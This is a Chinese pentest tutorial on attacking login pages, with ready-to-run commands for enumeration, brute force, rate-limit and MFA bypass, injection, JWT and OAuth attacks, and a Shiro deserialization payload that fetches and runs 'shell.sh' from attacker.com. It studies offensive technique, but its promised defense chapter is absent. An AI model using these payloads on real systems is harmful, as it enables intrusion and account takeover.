#  从信息收集到 RCE：从登录框开始  
泷羽sec-云和
                    泷羽sec-云和  泷羽sec-云和   2026-10-14 07:54  
  
#   
> 先说清楚：下面这些内容只适用于有授权的渗透测试、企业内部安全评估和 CTF 比赛。没拿到授权的目标别碰，后果自负。  
  
  
不少人拿到登录框的第一反应就是开 Burp 怼字典，十次里有九次是白怼。我自己的习惯是先花半个小时把目标摸一遍——后端什么语言、是不是前后端分离、有没有暴露接口文档。这些东西搞清楚了再动手，后面事半功倍。这篇文章就把我平时的完整流程过一遍，从信息收集一直讲到 RCE，每一步都附上能直接用的命令。  
  
全文按这个顺序写：信息收集 → 登录功能本身的毛病 → 会话和认证 → 背后的 API → 框架漏洞 → 逻辑漏洞 → 最后给防守方的加固建议。  
## 一、信息收集与指纹识别  
  
动手之前先搞清楚三件事：认证入口在哪、后端什么技术栈、有没有泄露的接口文档。这三件事直接决定后面往哪打。  
### 1.1 找到认证入口，抓一个完整的登录包  
  
认证端点来来回回就那么几个：/login、/signin、/auth、/authenticate、/oauth、/sso、/api/auth，有些还藏在独立的 sso 域名下面。如果怀疑目标是 OAuth / OpenID Connect 架构，先去取发现文档：  
```
                       
curl -s https://target.com/.well-known/openid-configuration | jq  
```  
  
这个文档会把授权端点、令牌端点、支持的签名算法、JWKS 地址全交代了，等于是后面打 JWT 和 OAuth 的地图。  
  
抓包的具体做法：  
  
1. `F12` 打开 Network 面板，勾上 **Preserve log**。不勾的话登录一跳转请求就没了，新手最常踩这个坑。  
  
2. 故意输错一次密码再提交。错密码和正确密码走的是同一个接口，但错密码不会触发风控，最适合拿来分析。  
  
3. 右键请求 → Copy as cURL，存到本地重放一遍确认能复现。要记的就四样：方法+URL、参数是表单还是 JSON 还是 XML、成功和失败各自返回什么、认证靠 Session Cookie 还是 JWT。  
  
把 Copy as cURL 的内容贴进终端跑一遍，确认和浏览器看到的一致  
  
4. 再编一个肯定不存在的用户名登录一次，跟上一组并排对比。两边差在哪，后面枚举用户就利用哪。  
  
5. 顺手 Ctrl+U 看一眼页面源码。注释、隐藏的测试表单、硬编码的接口地址，经常有意外收获。  
### 1.2 技术栈识别  
  
技术栈决定打哪里，插件和命令行配合着来：  
  
Wappalyzer装上，打开登录页，前端框架（Vue / React / Angular）、Web 服务器、CDN 一目了然。命令行再来一遍：  
```
                                
whatweb https://target.com
      
curl -sI https://target.com | egrep -i ”server|x-powered-by|set-cookie”  
```  
  
像 X-Powered-By: PHP/7.4.3 这种就是白送的。不过最快的判断方法是看 Set-Cookie：  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">Cookie 特征</span></section></th><th style="text-align: left;"><section><span leaf="">说明</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><code><span leaf="">JSESSIONID</span></code></td><td style="text-align: left;"><section><span leaf="">Java 应用，Tomcat / Spring 全家桶概率大</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">PHPSESSID</span></code></td><td style="text-align: left;"><section><span leaf="">PHP 环境</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">ASP.NET_SessionId</span></code></td><td style="text-align: left;"><section><span leaf="">IIS + .NET</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">connect.sid</span></code></td><td style="text-align: left;"><section><span leaf="">Node.js + Express</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">rememberMe=deleteMe</span></code></td><td style="text-align: left;"><section><span leaf="">Apache Shiro，重点关照对象，见第五章</span></section></td></tr></tbody></table>  
还有两个信号值得留意：  
  
一是前后端分离。如果发现页面在 a.com，接口却在 api-xxxxxx.com，这种架构接口通常一大堆，而且 API 域名的防护经常比主站松，前后端要分开测。  
  
二是框架特征。Shiro 最好认：随便发个 rememberMe Cookie，响应头里回 Set-Cookie: rememberMe=deleteMe 就是它。Spring Security 的默认登录页有固定样式，Struts2 的 URL 带 .action 或 .do 后缀。  
### 1.3 把 JS 文件翻个底朝天  
  
前后端分离的目标，JS 就是现成的接口地图，里面还时不时藏着 AK/SK 这种大礼。我的固定动作：  
  
F12 → Sources 面板，找到 .js  
 文件（一般在 /static/js/  
 下），或者直接 Ctrl+U 看页面引了哪些 JS。  
  
全拉到本地：  
```
                               
wget -r -np -nH --cut-dirs=1 -A ”*.js” https://target.com/static/js/
      
# 懒得用 wget 就在 Network 面板筛 JS，右键 Save all as HAR
      
```  
  
敏感信息先过一遍：  
```
                                
grep -rniE ”password|passwd|secret|token|apikey|accesskey|github” ./
      
grep -rniE ”admin|test|debug” ./ --include=”*.js”
     
```  
  
接口路径批量提取：  
```
                         
grep -rhoE '[”'”'”']/[a-zA-Z0-9_/.-]{3,}[”'”'”']' ./*.js | sort -u
     
```  
  
    
  
提出来的路径很多是相对的，比如 role/register  
，得拼上现成的 API 前缀（/api/  
、/system/  
 之类）变成 /api/role/register  
 再去访问，直接请求是 404 的。  
  
Webpack 动态 import 的 chunk 文件别漏了，重复上面 3~5 步。另外试试请求 app.xxxx.js.map  
，sourcemap 还在的话能还原完整源码。  
  
说真的，光跑一遍 grep accesskey 就捡到云凭证的案例，我见过不止一次，里面不乏大厂项目。所以这一步别偷懒。  
### 1.4 信息泄露端点  
  
拿脚本批量扫一遍常见端点：  
```
                                                            
for path in swagger-ui.html v2/api-docs v3/api-docs actuator/env \
      
  actuator/heapdump actuator/gateway/routes graphql .git/config \
      
  .svn/entries .DS_Store crossdomain.xml; do
      
  code=$(curl -s -o /dev/null -w ”%{http_code}” https://target.com/$path)
      
  echo ”$code  /$path”
      
done
    
  
```  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">端点</span></section></th><th style="text-align: left;"><section><span leaf="">能拿到什么</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><code><span leaf="">/swagger-ui.html</span></code></td><td style="text-align: left;"><section><span leaf="">全部接口定义，跟送分题一样</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">/v2 /v3/api-docs</span></code></td><td style="text-align: left;"><section><span leaf="">Swagger JSON，导入 Postman 直接调用</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">/actuator/env</span></code></td><td style="text-align: left;"><section><span leaf="">Spring 环境变量，偶尔带数据库密码</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">/actuator/heapdump</span></code></td><td style="text-align: left;"><section><span leaf="">堆转储，丢给 MAT 分析能挖出密钥</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">/graphql</span></code></td><td style="text-align: left;"><section><span leaf="">GraphQL 接口，记得试内省查询</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">/.git/config</span></code></td><td style="text-align: left;"><section><span leaf="">Git 泄露，上 GitHack 还原源码</span></section></td></tr></tbody></table>  
这里有个判断技巧：返回  
500 并且提示「请先登录」，比返回 200 更值得记——路径是真实存在的，只是暂时没权限。先记小本本上，第四章用得上。返回 404 才是真的不存在。  
## 二、登录功能基础测试  
### 2.1 用户名枚举  
  
登录失败的时候，如果系统对「用户不存在」和「密码错误」给出不一样的反应，用户名单基本等于半公开了。这是登录框上最常见、也最容易被开发忽略的问题。  
  
确认枚举点有四种方法，按从易到难：  
  
① 错误文案差异。自己注册一个账号，再编一个不存在的，各登录一次对比提示。出现「用户不存在」和「密码错误」两种说法，就是能枚举。  
  
② 响应长度差异。文案统一了之后，看响应包长度。Burp 里按 Length 排序，后端走了不同分支往往差几十个字节。  
  
③ 状态码差异。有的系统对不存在的用户返回 401，密码错返回 403，或者 JSON 里的 code 字段不一样。  
  
④ 响应时间差异。这招最隐蔽：有效用户名会触发密码哈希计算，BCrypt、Argon2 算一次要几十上百毫秒；不存在的用户直接跳过，响应明显快。Spring Security 的 CVE-2025-9824 就是这么个时序枚举洞。  
  
用 Burp Intruder 批量跑，具体这么配：  
  
登录请求 Send to Intruder，Attack type 选   
Sniper。    
  
Positions 里只给 username 加 §  
 标记，密码固定一个弱口令。  
  
Payloads 加载用户名字典，常见用户名、姓名拼音、手机号段都行，10 万条起步。  
  
Settings → Grep - Match 里加失败提示的关键词，结果自动打标签。  
  
跑完按 Length、Status、Response time 三列分别排序，任何一列出现聚类，聚类之外的就是有效账号。  
  
不想开 Burp 的话，时序枚举命令行也能验证：  
```
                                                            
# 不存在的用户应该明显更快
      
for u in admin not_exist_user_zzzz test; do
      
  echo -n ”$u : ”
      
  curl -s -o /dev/null -w ”%{time_total}s\n” -X POST https://target.com/login \
      
    -d ”username=$u&password=x”
      
done
    
```  
### 2.2 爆破和密码喷洒  
  
先手动试默认口令：admin/admin、admin/password、test/test、admin/123456，再加各产品的出厂默认。运气好直接收工。  
  
再试有规律的弱口令：Password1、Welcome2024、公司名+年份、员工姓名拼音+数字，这类在有针对性的测试里命中率不低。  
  
最后才上字典：  
```
                                                     
hydra -L users.txt -P passwords.txt target.com http-post-form \
      
  ”/login:user=^USER^&pass=^PASS^:Invalid”
      
# -L 用户名字典  -P 密码字典
      
# 最后一个参数分三段：登录路径 / POST参数 / 失败响应里的特征字符串
    
  
```  
  
TOP3000 密码字典在实战里已经够用了。如果目标拿手机号当账号，结合前面信息收集阶段搞到的手机号段做定向喷洒。  
  
有一点必须放在前面：  
动手之前先故意连错三四次密码，看看有没有锁定提示。有锁定机制就别拿字典猛怼了，改成密码喷洒——一个弱密码怼一万个用户，单账号只失败一两次，风控基本看不见，并发也别开高，1~2 就够。不然把真实用户账号打锁了，管理员马上就会发现有人在搞事。  
### 2.3 速率限制绕过  
  
限速做对的系统其实不多。最常见的毛病是拿 IP 当限速的 key，而 IP 是从 X-Forwarded-For 里读的——这个头是请求方自己写的，想填什么填什么。  
  
两个真实案例。CVE-2026-11922：zenml 用 Uvicorn 启动的时候带了 --proxy-headers --forwarded-allow-ips *，限速器直接拿 X-Forwarded-For 当 key，每次请求换个值就完事。Appsmith 那个 Caddy 配置更典型，限速 key 是 {header.Forwarded}+{header.X-Forwarded-For}+{remote_host} 拼出来的，三个分量里两个是客户端控制的，每个请求都是独立限速桶，限制永远不触发。  
  
验证方法很简单，发一千个请求，每个换不同的伪造 IP：  
```
                                                                                 
for i in $(seq 1 1000); do
      
  curl -s -o /dev/null -X POST https://target/login \
      
    -H ”X-Forwarded-For: 10.0.0.$i” \
      
    -H ”X-Real-IP: 10.0.0.$i” \
      
    -d ”username=admin&password=guess$i”
      
done
      
 
      
# 看有没有触发 429 或锁定提示
      
# 一千个请求全正常返回，说明限速按伪造 IP 分桶，绕过去了
    
  
```  
  
另一个思路是 IPv6。云主机开个 IPv6 出口，一个 /64 前缀下面地址多到用不完，每个请求换一个源地址，天然绕限速。还有些系统只认 IPv4 格式的 XFF，塞个 ::1 进去直接让它的解析逻辑出问题。  
### 2.4 验证码绕过  
  
验证码这块实现质量参差不齐，按清单逐项过：  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">毛病</span></section></th><th style="text-align: left;"><section><span leaf="">怎么验证</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><section><span leaf="">不刷新，能重复用</span></section></td><td style="text-align: left;"><section><span leaf="">Burp 重放同一个带验证码的请求，多次 200</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">只做前端校验</span></section></td><td style="text-align: left;"><section><span leaf="">删掉验证码参数，或者把返回的 fail 改成 success 再提交</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">空值 / 万能码</span></section></td><td style="text-align: left;"><section><span leaf="">传空、传 null、传 0000 或 8888</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">验证码跟着响应回来了</span></section></td><td style="text-align: left;"><section><span leaf="">看响应 JSON、Cookie，或者图片 URL 能不能猜</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">短信验证码不限频</span></section></td><td style="text-align: left;"><section><span leaf="">4 位一共一万种，能爆破；不限频还能刷短信轰炸</span></section></td></tr></tbody></table>  
通用的验证流程：  
  
先正常走一遍：获取验证码，用正确凭据登录成功，在 Burp 里把这次请求标出来。  
  
Repeater 重放三次。还是成功，说明验证码没做一次性校验。  
  
删掉验证码参数重放，再传空值重放。哪个成功了就是哪类问题。  
  
图形验证码下一百张，丢给 ddddocr 之类的 OCR 跑一遍，识别率超过三成就值得批量打了。  
### 2.5 注入类测试  
  
登录参数也是注入高发区。先看请求是什么格式，再决定扔什么：  
```
    
          
# ① 表单格式 → SQL 注入，按顺序试，看报错和登录结果
      
' or 1=1--
      
' or '1'='1'--
      
admin'--
      
admin'
            
#      
      
# ② JSON 格式 → NoSQL 注入（MongoDB 的老几样）
      
{”username”:{”$ne”:null},”password”:{”$ne”:null}}
      
{”username”:”admin”,”password”:{”$regex”:”.*”}}
      
{”username”:{”$in”:[”admin”,”administrator”]},”password”:{”$ne”:””}}
      
 
      
# ③ XML 格式 → XXE
      
<?xml version=”1.0”?>
      
<!DOCTYPE foo [<!ENTITY xxe SYSTEM ”http://attacker.com”>]>
      
&xxe;
      
 
      
# ④ 用户名会被模板渲染 → SSTI
      
{{7*7}}
           
# 返回 49 就是 Jinja2/Twig 这类
      
${7*7}
           
# 返回 49 可能是 Freemarker/EL
    
  
```  
  
没回显的时候别急着放弃：SQL 用时间盲注，' AND SLEEP(5)-- 看响应是不是慢了五秒；XXE 换成外带，让目标去解析你的 DNSLog 域名，DNSLog 平台上有记录就是通了。  
## 三、会话与认证机制  
### 3.1 Session 安全  
  
会话固定测起来很快，四步：  
1.      
  
1. 不登录，访问一下目标，记下 Set-Cookie  
 里的 Session ID，叫它 S1。  
  
1.      
  
1. 正常登录，再记一次，S2。  
  
1.      
  
1. S1 和 S2 一样，就是会话固定。攻击者可以预先弄个已知 ID，骗受害者点带这个 ID 的链接登录，然后拿同一个 ID 接管会话。  
  
1.      
  
1. 顺手再测一下退出登录之后旧 Cookie 是不是马上失效——很多系统只是前端跳了个页，后端 Session 还活着。  
  
Cookie 安全属性在 DevTools → Application → Cookies 里看：  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">属性</span></section></th><th style="text-align: left;"><section><span leaf="">没它会怎样</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><code><span leaf="">HttpOnly</span></code></td><td style="text-align: left;"><section><span leaf="">JS 能读 Cookie，一个 XSS 就把会话偷了</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">Secure</span></code></td><td style="text-align: left;"><section><span leaf="">HTTP 下明文传，中间人直接嗅探</span></section></td></tr><tr><td style="text-align: left;"><code><span leaf="">SameSite</span></code></td><td style="text-align: left;"><section><span leaf="">没有 Lax/Strict 就容易被 CSRF 利用</span></section></td></tr></tbody></table>### 3.2 JWT 攻击  
  
登录成功返回 JWT 的话，先别急着打，把 payload 解出来看看里面装了什么——role、isAdmin 这种字段经常出现，是后面越权的线索：  
```
                                       
echo ”..” | cut -d. -f2 | base64 -d | jq
      
# 或者直接贴 jwt.io
      
# 重点看：sub/uid/role 等字段、exp 过期时间、头部的 kid/jku/x5u
    
  
```  
  
能打的点主要是四个。  
  
一是 alg:none。把头部 alg 改成 none，签名段删掉只留结尾的点，看服务器收不收：  
```
                                       
# header:  {”alg”:”none”,”typ”:”JWT”}  → Base64URL 编码
      
# payload: 不动
      
# 发出去:  xxxx.yyyy.   （签名留空，结尾的点留着）
    
  
```  
  
二是算法混淆。服务器用 RS256 的话，把算法改成 HS256，拿公钥当 HMAC 密钥签名。服务器不严格校验算法类型就会收。公钥从 jwks_uri 或者证书里拿。  
  
三是弱密钥爆破。HS256 的密钥经常弱得离谱：  
```
                                                     
# hashcat 模式 16500
      
hashcat -m 16500 -a 0 token.txt wordlists/common-secrets.txt
      
 
      
# 或者 jwt-toolkit，静态审计 + 爆破 + 伪造一体
      
jwt-toolkit crack  wordlists/common-secrets.txt --threads 8
    
  
```  
  
四是头部参数注入。kid 改成 ../../../../dev/null 或者注入 SQL 干扰密钥查找；jku、x5u 指向自己搭的 JWKS 端点，骗服务器用你的公钥验签。顺带检查 payload 里有没有塞密码、手机号这类不该出现的东西。  
### 3.3 OAuth 2.0 逻辑漏洞  
  
OAuth 是账号接管的重灾区，三个点必测。  
  
redirect_uri 绕过。授权服务器理论上要严格比对预注册值，但实际实现的验证经常很水：前缀匹配、后缀匹配、正则写错。假设注册的是 https://legit.com/callback，挨个试：  
```
                                                     
https://legit.com/callback/../evil
      
https://legit.com/callback.evil.com
      
https://legit.com/callbackevil
      
https://legit.com/callback?next=evil.com
      
https://legit.com/callback%23@evil.com
    
  
```  
  
哪个能让授权码落到你控制的地址，拿它换 access_token 就接管了。验证时把 redirect_uri 指到自己的 Burp Collaborator 或 DNSLog，看有没有带 code= 的请求进来。  
  
state 参数。授权请求里没有 state，或者 state 不是一次性的，就能做 CSRF，把受害者的授权绑到攻击者账号上。CVE-2026-56425 那个案例更离谱：拿 PHP 的 session_id 当 state，认证之后还不换 Session ID，会话固定和 CSRF 一起来。  
  
授权码重放。code 应该一次性、用完就废。截获一个 code，在另一个会话里重放，看能不能绑到别人账号；用过的 code 再发一次，看还认不认。  
### 3.4 MFA 绕过  
  
按成本从低到高挨个试：  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">顺序</span></section></th><th style="text-align: left;"><section><span leaf="">手法</span></section></th><th style="text-align: left;"><section><span leaf="">怎么操作</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><section><span leaf="">1</span></section></td><td style="text-align: left;"><section><span leaf="">直接跳</span></section></td><td style="text-align: left;"><section><span leaf="">密码过了之后直接访问 </span><code><span leaf="">/dashboard</span></code><span leaf=""> 或后台首页，看 MFA 步骤能不能跳过</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">2</span></section></td><td style="text-align: left;"><section><span leaf="">改响应</span></section></td><td style="text-align: left;"><section><span leaf="">Burp 拦截 MFA 验证响应，</span><code><span leaf="">success:false</span></code><span leaf=""> 改成 </span><code><span leaf="">true</span></code><span leaf="">，或者 302 的 Location 从 </span><code><span leaf="">/mfa</span></code><span leaf=""> 改成 </span><code><span leaf="">/dashboard</span></code></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">3</span></section></td><td style="text-align: left;"><section><span leaf="">玩参数</span></section></td><td style="text-align: left;"><section><span leaf="">OTP 传空、传 null、传数组 </span><code><span leaf="">[&#34;123456&#34;]</span></code><span leaf="">、同一个参数传两次</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">4</span></section></td><td style="text-align: left;"><section><span leaf="">爆破</span></section></td><td style="text-align: left;"><section><span leaf="">4 位一万种、6 位一百万种，Intruder 选 Numbers 从 000000 跑到 999999，注意限速</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">5</span></section></td><td style="text-align: left;"><section><span leaf="">复用</span></section></td><td style="text-align: left;"><section><span leaf="">之前用过的有效 OTP 再发一遍，看服务端标没标记失效</span></section></td></tr></tbody></table>### 3.5 Remember Me  
  
Shiro 的 rememberMe Cookie 走的是 Base64 解码 → AES 解密 → Java 反序列化这条路，实现不好直接就是第五章的反序列化 RCE。就算不是 Shiro 也值得看一眼：勾上 Remember Me，关浏览器重开，抓新请求看凭据字段——不少系统就是往 Cookie 里塞了个明文或者 Base64 的密码。  
## 四、API 接口测试  
  
前面几章都没打进去也别收工——登录框只是门脸，背后的 API 才是大头。前后端分离的系统，接口数量经常是页面数量的十倍往上。  
### 4.1 未授权访问  
  
1.3 节从 JS 里提取的接口路径，现在拿出来批量过一遍：  
```
          
while read path; do
      
  for m in GET POST; do
      
    code=$(curl -s -o /dev/null -w ”%{http_code}” -X $m ”https://api.target.com$path”)
      
    echo ”$m $code $path”
      
  done
      
done < paths.txt | tee result.txt
      
# 500 + ”请先登录” → 路径存在但没鉴权好，重点记下来
      
# 200/401/403   → 分清是没鉴权，还是有鉴权但能绕
    
  
```  
  
接口不够的话上 ffuf 再刮一层：ffuf -w api-wordlist.txt -u https://api.target.com/FUZZ -mc 200,401,403,500  
### 4.2 分页参数  
  
接口带 pageNum、pageSize 的话，把 pageSize 拉满试试：  
```
   
      
      
    
          
curl ”https://api.target.com/plan/task/manager/list/export?pageNum=1&pageSize=999”
      
# 再试 99999、负数、0、null，看返回行数和报错
    
  
```  
  
export 类的接口尤其喜欢这么写，一页 999 条基本等于拖库。  
### 4.3 参数替换和越权  
  
路径资源替换：/student/export 改成 /teacher/export、/admin/export，指不定就拿到别的角色的数据了。  
  
批量赋值：注册或改资料的时候往请求体里塞本来没有的字段：  
```
                         
{”username”:”test”,”password”:”Test@123”,”role”:”admin”,”isAdmin”:true,”balance”:9999} 
```  
  
注册完马上登录，看 JWT payload 里的 role 变没变。  
  
IDOR：id、orderId、userId 这些参数加一减一，或者换成同格式的别人 ID。  
### 4.4 低权限 JWT 也有用  
  
账号没激活、没审核通过，不代表注册发的 JWT 一点用没有。常见情况是低权限 Token 照样能调一批接口。做法：注册 → 登录拿 JWT → 带着它把 4.1 收集的接口全过一遍，跟不带 Token 的响应逐个对比，有差异的就是越权面。  
## 五、框架漏洞利用  
  
如果第一章的指纹识别做扎实了，这章是最省力的——对上版本号直接拿现成 POC。  
### 5.1 Apache Shiro 反序列化（CVE-2016-4437）  
  
Shiro 的「记住我」是把用户身份序列化、AES 加密、Base64 之后塞进 rememberMe Cookie，请求来了再反向走一遍。问题出在 1.2.5 之前用的是硬编码的默认密钥（kPH+bIxk5D2deZiIxcaaaA== 之类），而且解密之后直接反序列化，中间没有任何校验。  
  
先确认是不是 Shiro：  
```
                                
curl -s -I -H ”Cookie: rememberMe=test” https://target.com | grep -i deleteMe
      
# 响应头有 Set-Cookie: rememberMe=deleteMe 基本就是了 
```  
  
利用分四步：  
  
    
  
1.ysoserial 生成恶意序列化对象：  
```
                                
java -jar ysoserial.jar CommonsBeanutils1 \
      
  ”curl http://attacker.com/shell.sh | bash” > payload.class 
```  
  
2.拿默认密钥给 payload 做 AES 加密加 Base64。手撸麻烦，直接用 ShiroExploit 之类的工具，密钥爆破也一起做了。  
  
 3.编码结果塞 Cookie 发出去：                          
```
curl -H ”Cookie: rememberMe=” https://target.com/
```  
  
4.1服务器解密、反序列化，命令执行。Metasploit 里也有现成模块 Apache Shiro v1.2.4 Cookie RememberME Deserial RCE  
。  
  
还有 Shiro-721（CVE-2019-12422）值得单独说：密钥不是默认的也有救，AES-128-CBC 可以吃 Padding Oracle 攻击。条件是你得先有一个合法的 rememberMe Cookie 当前缀，然后不停发包看响应差异，慢慢把恶意 Cookie 磨出来。一次成功的攻击要发几万个包，跑几个小时很正常，影响 Shiro 1.4.2 之前的版本。  
### 5.2 Spring Security 认证绕过  
  
CVE-2025-22228 这个有点意思：BCryptPasswordEncoder.matches() 处理超过 72 个字符的密码时，只要前 72 个字符跟目标密码的前 72 个一样，就错误地返回 true。构造个超长密码就能过认证。  
  
影响版本：5.7 < 5.7.16、5.8 < 5.8.18、6.0 < 6.0.16、6.1 < 6.1.14、6.2 < 6.2.10、6.3 < 6.3.8、6.4 < 6.4.4。  
  
不过这个洞有条件限制——目标得用 BCrypt，而且密码得真的超过 72 位，实战里命中率不算高。但指纹对上了的话试一下也不费事。  
### 5.3 其他框架的速测项  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">框架</span></section></th><th style="text-align: left;"><section><span leaf="">怎么快速确认</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><section><span leaf="">Log4j（Log4Shell）</span></section></td><td style="text-align: left;"><section><span leaf="">登录参数里塞 </span><code><span leaf="">${jndi:ldap://你的DNSLog地址/a}</span></code><span leaf="">，DNSLog 有解析记录就是中了，再考虑怎么弹回显</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">Shiro 权限绕过</span></section></td><td style="text-align: left;"><section><span leaf="">路径截断：</span><code><span leaf="">/admin/;/</span></code><span leaf="">。Shiro 鉴权看分号前半，Spring Boot 处理 URL 取后半，两边不一致就绕了</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">Struts2</span></section></td><td style="text-align: left;"><section><span leaf="">URL 带 </span><code><span leaf="">.action</span></code><span leaf="">、</span><code><span leaf="">.do</span></code><span leaf=""> 的直接上 Struts2Scan 之类的扫描器，把已知 OGNL 注入过一遍</span></section></td></tr></tbody></table>## 六、逻辑漏洞  
  
自动化工具扫不出来的洞，基本都在这一章。逻辑漏洞拼的是对业务的理解，跟工具没什么关系。  
### 6.1 条件竞争  
  
并发注册、并发重置密码、并发领券这类操作都可能有竞争问题。Burp 用单包多线程（Race condition）模式，或者写个脚本：  
```
          
import threading, requests   
  
   
url = ”https://target.com/api/coupon/claim”
      
token = ”你的JWT”
      
 
      
def claim():
      
    requests.post(url, headers={”Authorization”: token}, json={”id”: 1}, timeout=10)
      
 
      
# 50 个线程一起打
      
ts = [threading.Thread(target=claim) for _ in range(50)]
      
[t.start() for t in ts]
      
[t.join() for t in ts]
    
  
```  
### 6.2 越权  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">类型</span></section></th><th style="text-align: left;"><section><span leaf="">测法</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><section><span leaf="">水平越权</span></section></td><td style="text-align: left;"><section><span leaf="">改用户 ID、订单 ID 访问别人的数据。准备两个测试账号对照着验证，别拿真人数据试</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">垂直越权</span></section></td><td style="text-align: left;"><section><span leaf="">普通用户直接请求管理员接口；把管理端抓到的请求换成普通 Token 重放</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">批量赋值</span></section></td><td style="text-align: left;"><section><span leaf="">注册、改资料时加 </span><code><span leaf="">role</span></code><span leaf="">、</span><code><span leaf="">isAdmin</span></code><span leaf="">、</span><code><span leaf="">balance</span></code><span leaf=""> 这类隐藏字段，具体见 4.3</span></section></td></tr></tbody></table>### 6.3 密码重置  
  
密码重置是逻辑漏洞的重灾区，按清单逐项过：  
<table><thead><tr><th style="text-align: left;"><section><span leaf="">问题</span></section></th><th style="text-align: left;"><section><span leaf="">验证方法</span></section></th></tr></thead><tbody><tr><td style="text-align: left;"><section><span leaf="">令牌能猜</span></section></td><td style="text-align: left;"><section><span leaf="">连续重置两次对比 token，看是不是时间戳、用户 ID、自增 ID 拼的</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">令牌不失效</span></section></td><td style="text-align: left;"><section><span leaf="">改密成功之后拿旧 token 重放，看还能不能用</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">令牌在响应里</span></section></td><td style="text-align: left;"><section><span leaf="">抓包看重置接口的响应、前端跳转 URL 里是不是直接带着 token</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">Host 头注入</span></section></td><td style="text-align: left;"><section><span leaf="">把请求的 Host 改成自己的域名，看重置邮件里的链接指向哪</span></section></td></tr><tr><td style="text-align: left;"><section><span leaf="">任意邮箱重置</span></section></td><td style="text-align: left;"><section><span leaf="">请求里的邮箱参数换成自己的，看验证码发给谁</span></section></td></tr></tbody></table>  
打登录框这件事，总结下来就一句话：先摸清，再试探，能浅打别深打，能手工别上工具。这篇文章里的套路都是平时测试攒下来的，个别案例的细节可能记得有出入，以官方公告为准。防御那一章可以直接打印出来当 checklist 用。  
  
